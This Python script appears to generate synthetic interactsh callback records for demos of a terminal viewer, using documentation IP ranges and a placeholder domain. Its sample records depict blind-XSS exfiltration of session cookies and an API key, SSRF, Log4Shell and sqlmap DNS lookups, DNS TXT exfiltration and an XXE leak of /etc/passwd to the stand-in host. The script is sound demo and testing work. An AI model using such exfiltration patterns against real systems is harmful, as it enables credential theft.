#!/usr/bin/env python3
"""Generate deterministic, realistic-looking fake interactsh interactions for
screenshots and demos. No real hosts/IPs: the callback domain is oob.example.com
and all sources are in the reserved TEST-NET-1/2/3 documentation ranges.

    python3 examples/gen-sample-data.py > examples/sample-interactions.jsonl

Output is one JSON object per line, matching the schema interactsh-tui parses
(protocol, full-id, raw-request, raw-response, remote-address, timestamp, q-type).
"""
import datetime
import hashlib
import json
import sys

ANCHOR = datetime.datetime(2026, 6, 22, 18, 5, 0, tzinfo=datetime.timezone.utc)
CORR = "c8f3k2p9qrs7t1v0wxyz"  # 20-char correlation id (as interactsh prints)
DOMAIN = "oob.example.com"


def fid(seed: str) -> str:
    """Deterministic full sub-domain id: correlation prefix + 13-char suffix."""
    return CORR + hashlib.sha1(seed.encode()).hexdigest()[:13]


def token(seed: str) -> str:
    """The 33-char marker interactsh echoes in HTTP response bodies."""
    return hashlib.sha1(("tok" + seed).encode()).hexdigest()[:33]


def stamp(secs_ago: int, seed: str) -> str:
    t = ANCHOR - datetime.timedelta(seconds=secs_ago)
    nanos = int(hashlib.sha1(seed.encode()).hexdigest()[:8], 16) % 1_000_000_000
    return t.strftime("%Y-%m-%dT%H:%M:%S") + f".{nanos:09d}Z"


def http_resp(seed: str) -> str:
    return (
        "HTTP/1.1 200 OK\r\nConnection: close\r\n"
        "Access-Control-Allow-Origin: *\r\nServer: oob.example.com\r\n"
        "Content-Type: text/html; charset=utf-8\r\nX-Interactsh-Version: 1.2.2\r\n\r\n"
        f"<html><head></head><body>{token(seed)}</body></html>"
    )


def dns_req(host: str, qtype: str, qid: int) -> str:
    return (
        f";; opcode: QUERY, status: NOERROR, id: {qid}\r\n"
        ";; flags: rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\r\n\r\n"
        f";; QUESTION SECTION:\r\n;{host}.\tIN\t {qtype}\r\n"
    )


def dns_resp(host: str, qtype: str, qid: int) -> str:
    return (
        f";; opcode: QUERY, status: NOERROR, id: {qid}\r\n"
        ";; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\r\n\r\n"
        f";; ANSWER SECTION:\r\n{host}.\t60\tIN\t{qtype}\t203.0.113.10\r\n"
    )


records = []


def http(secs, remote, req_lines, *, seed=None, host_sub=None):
    seed = seed or f"{secs}-{remote}-{req_lines[0]}"
    host = host_sub or fid(seed)
    # Fill the Host header with the callback sub-domain.
    req = "\r\n".join(req_lines).replace("{HOST}", f"{host}.{DOMAIN}")
    records.append({
        "protocol": "http",
        "unique-id": host,
        "full-id": host,
        "raw-request": req if req.endswith("\r\n\r\n") else req + "\r\n\r\n",
        "raw-response": http_resp(seed),
        "remote-address": remote,
        "timestamp": stamp(secs, seed),
    })


def dns(secs, remote, qtype, *, seed=None, sub=None):
    seed = seed or f"{secs}-{remote}-{qtype}-{sub}"
    host = (f"{sub}." if sub else "") + fid(seed)
    qid = int(hashlib.sha1(seed.encode()).hexdigest()[:4], 16)
    records.append({
        "protocol": "dns",
        "q-type": qtype,
        "unique-id": fid(seed),
        "full-id": host,
        "raw-request": dns_req(host, qtype, qid),
        "raw-response": dns_resp(host, qtype, qid),
        "remote-address": remote,
        "timestamp": stamp(secs, seed),
    })


def smtp(secs, remote, body_lines, *, seed=None):
    seed = seed or f"{secs}-{remote}-smtp"
    host = fid(seed)
    req = "\r\n".join(body_lines).replace("{HOST}", f"{host}.{DOMAIN}")
    records.append({
        "protocol": "smtp",
        "unique-id": host,
        "full-id": host,
        "raw-request": req + "\r\n",
        "raw-response": "220 oob.example.com ESMTP\r\n250 OK\r\n250 OK\r\n354 Go ahead\r\n",
        "remote-address": remote,
        "timestamp": stamp(secs, seed),
    })


# ---- the hero record (newest -> top of the list, selected by default) ----
http(
    30, "203.0.113.45",
    [
        "POST /c?id=c8f3k2 HTTP/1.1",
        "Host: {HOST}",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Origin: https://admin.acme-corp.internal",
        "Referer: https://admin.acme-corp.internal/dashboard",
        "Content-Type: application/json",
        "Content-Length: 214",
        "",
        '{"cookie":"sessionid=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsInJvbGUiOiJhZG1pbiJ9; '
        'csrftoken=Hk7Qd2","url":"https://admin.acme-corp.internal/dashboard",'
        '"localStorage":{"api_key":"sk_live_8Kd0fJ2qWnXa"}}',
    ],
    seed="bxss-exfil",
)

# ---- blind XSS GET beacon (cookie in query) ----
http(
    240, "203.0.113.45",
    [
        "GET /x?c=sessionid%3DeyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9 HTTP/1.1",
        "Host: {HOST}",
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
        "Referer: https://support.acme-corp.internal/ticket/4471",
        "Accept: */*",
    ],
    seed="bxss-get",
)

# ---- SSRF: vulnerable server fetches our callback (Go http client) x2 ----
for i, s in enumerate((420, 1180)):
    http(
        s, "198.51.100.23",
        [
            "GET / HTTP/1.1",
            "Host: {HOST}",
            "User-Agent: Go-http-client/2.0",
            "Accept-Encoding: gzip",
        ],
        seed=f"ssrf-go-{i}",
    )

# ---- SSRF via image/PDF render (headless chrome) ----
http(
    900, "198.51.100.77",
    [
        "GET /render.png HTTP/1.1",
        "Host: {HOST}",
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
        "HeadlessChrome/125.0.0.0 Safari/537.36",
        "Accept: image/avif,image/webp,*/*",
    ],
    seed="ssrf-headless",
)

# ---- Nuclei scanner hammering one path (4x identical -> grouping ×4) ----
for i, s in enumerate((150, 155, 161, 168)):
    http(
        s, "192.0.2.99",
        [
            "GET /s/payloads HTTP/1.1",
            "Host: {HOST}",
            "User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
            "Connection: close",
        ],
        seed="nuclei",  # same seed => identical request => one group
    )

# ---- manual recon: curl + wget ----
http(
    3600, "203.0.113.12",
    ["GET /test HTTP/1.1", "Host: {HOST}", "User-Agent: curl/8.7.1", "Accept: */*"],
    seed="curl-test",
)
http(
    7200, "203.0.113.12",
    ["GET /a HTTP/1.1", "Host: {HOST}", "User-Agent: Wget/1.21.4"],
    seed="wget-a",
)

# ---- Log4Shell: JNDI/LDAP lookup resolves our host (DNS from public resolvers) ----
dns(300, "1.1.1.1", "A", seed="log4shell-1")
dns(305, "8.8.8.8", "AAAA", seed="log4shell-1")  # same target, AAAA follow-up

# ---- sqlmap blind OOB over DNS (3x identical A lookups -> grouping ×3) ----
for i, s in enumerate((600, 612, 640)):
    dns(s, "198.51.100.5", "A", seed="sqlmap-dns", sub="0x6c6f6f74")

# ---- DNS TXT data-exfil chunks (base32-ish labels) ----
for i, (s, chunk) in enumerate([
    (1500, "mfsg22loorxg63q"),
    (1505, "nbuw4z3pnzsxg5a"),
    (1510, "obqxe5dboruw2zi"),
]):
    dns(s, "192.0.2.5", "TXT", seed=f"exfil-{i}", sub=chunk)

# ---- DNS rebinding probe ----
dns(2400, "203.0.113.88", "A", seed="rebind")

# ---- SMTP OOB (XXE / SSRF to smtp, or email-header injection callback) ----
smtp(
    1800, "198.51.100.140",
    [
        "EHLO scanner.local",
        "MAIL FROM:<probe@oob.example.com>",
        "RCPT TO:<root@{HOST}>",
        "DATA",
        "Subject: xxe-oob",
        "X-Origin: file:///etc/passwd",
        "",
        "root:x:0:0:root:/root:/bin/bash",
        ".",
    ],
    seed="smtp-xxe",
)

# ---- a couple of older organic hits for timeline depth ----
http(
    18000, "203.0.113.200",
    [
        "GET /favicon.ico HTTP/1.1",
        "Host: {HOST}",
        "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    ],
    seed="organic-fav",
)
dns(36000, "9.9.9.9", "A", seed="old-dns-1")
http(
    54000, "192.0.2.140",
    ["GET / HTTP/1.1", "Host: {HOST}", "User-Agent: python-requests/2.32.3"],
    seed="old-pyreq",
)
dns(90000, "1.0.0.1", "NS", seed="old-ns")

# emit sorted oldest->newest (interactsh-tui re-sorts anyway)
records.sort(key=lambda r: r["timestamp"])
out = sys.stdout
for r in records:
    out.write(json.dumps(r) + "\n")
